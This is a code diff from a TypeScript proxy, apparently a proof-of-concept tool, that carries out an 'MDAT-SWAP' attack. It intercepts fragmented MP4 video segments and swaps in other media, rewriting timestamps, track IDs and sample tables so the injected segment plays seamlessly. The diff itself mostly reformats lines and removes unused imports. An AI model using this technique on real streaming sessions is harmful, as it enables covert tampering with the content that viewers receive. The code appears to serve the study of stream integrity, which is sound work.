@@ -1,8 +1,6 @@
 import fs from 'fs';
 import http from 'http';
-import path from 'path';
-import { fileURLToPath } from 'url';
-import type { SessionState, SegmentInfo, AttackResult } from '../types.js';
+import type { SessionState, AttackResult } from '../types.js';
 import { ORIGIN, MDAT_SWAP_SOURCE_PATH } from '../config.js';
 import { extractMoofMdat } from '../mp4/mdat-utils.js';
 import { replaceMoofMdat } from '../mp4/mdat-utils.js';
@@ -84,7 +82,11 @@ export async function proxyWithContentSwap(
             const currentTrackId = getTrackIdFromMoof(currentContent.moof);
             const injectedTrackId = getTrackIdFromMoof(swapContent.moof);
 
-            if (currentTrackId !== null && injectedTrackId !== null && currentTrackId !== injectedTrackId) {
+            if (
+              currentTrackId !== null &&
+              injectedTrackId !== null &&
+              currentTrackId !== injectedTrackId
+            ) {
               console.warn(`[MDAT-SWAP] Track ID mismatch, aborting attack`);
               await proxySegment(req, res, targetPath, currentSegNum);
               return resolve();
@@ -97,7 +99,9 @@ export async function proxyWithContentSwap(
             let injectedMoof = Buffer.from(setMfhdSequenceNumber(swapContent.moof, currentSegNum));
 
             if (currentTimestamp !== null) {
-              injectedMoof = Buffer.from(setBaseMediaDecodeTimeInMoof(injectedMoof, currentTimestamp));
+              injectedMoof = Buffer.from(
+                setBaseMediaDecodeTimeInMoof(injectedMoof, currentTimestamp),
+              );
             }
             if (currentTrackId !== null) {
               injectedMoof = Buffer.from(setTrackIdInMoof(injectedMoof, currentTrackId));
@@ -106,13 +110,17 @@ export async function proxyWithContentSwap(
               injectedMoof = Buffer.from(setTrunSampleCount(injectedMoof, injectedSampleCount));
             }
             if (injectedDurations && injectedDurations.length > 0) {
-              injectedMoof = Buffer.from(rewriteTrunSampleDurations(injectedMoof, injectedDurations));
+              injectedMoof = Buffer.from(
+                rewriteTrunSampleDurations(injectedMoof, injectedDurations),
+              );
             }
             if (injectedSampleSizes && injectedSampleSizes.length > 0) {
               injectedMoof = Buffer.from(rewriteTrunSampleSizes(injectedMoof, injectedSampleSizes));
             }
 
-            const attackedBytes = Buffer.from(replaceMoofMdat(segmentBytes, injectedMoof, swapContent.mdat));
+            const attackedBytes = Buffer.from(
+              replaceMoofMdat(segmentBytes, injectedMoof, swapContent.mdat),
+            );
 
             const verifyContent = extractMoofMdat(attackedBytes);
             if (!verifyContent?.moof || !verifyContent?.mdat) {
@@ -121,7 +129,10 @@ export async function proxyWithContentSwap(
               return resolve();
             }
 
-            const headers = { ...originRes.headers, 'Content-Length': attackedBytes.length.toString() };
+            const headers = {
+              ...originRes.headers,
+              'Content-Length': attackedBytes.length.toString(),
+            };
             delete headers['content-encoding'];
 
             res.writeHead(originRes.statusCode ?? 200, headers);
